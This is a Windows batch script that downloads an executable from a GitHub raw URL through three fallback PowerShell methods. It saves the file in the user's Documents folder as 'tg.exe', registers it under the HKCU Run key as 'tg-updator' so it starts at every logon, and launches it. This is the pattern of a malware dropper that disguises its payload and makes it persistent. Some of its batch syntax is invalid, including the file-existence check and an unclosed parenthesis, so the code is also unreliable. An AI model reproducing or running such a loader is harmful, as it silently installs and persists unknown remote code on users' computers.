for /f "tokens=2 delims=\" %%i in ('whoami') do set "user=%%i"

PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\%user%\Documents\tg.exe')"
if ERRORLEVEL 1 (
	PowerShell -Command "Invoke-RestMethod -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
	if ERRORLEVEL 1 ( 
		PowerShell -Command "Invoke-WebRequest -Uri 'https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' -OutFile 'C:\Users\%user%\Documents\tg.exe'"
	)
:check
	if "C:\Users\%user%\Documents\tg.exe" exist (
		reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "tg-updator" /t REG_SZ /d "C:\Users\%user%\Documents\tg.exe" /f
		start "" "C:\Users\%user%\Documents\tg.exe"
	) else ( 
		timeout /t 1 >nul
		goto check
	)
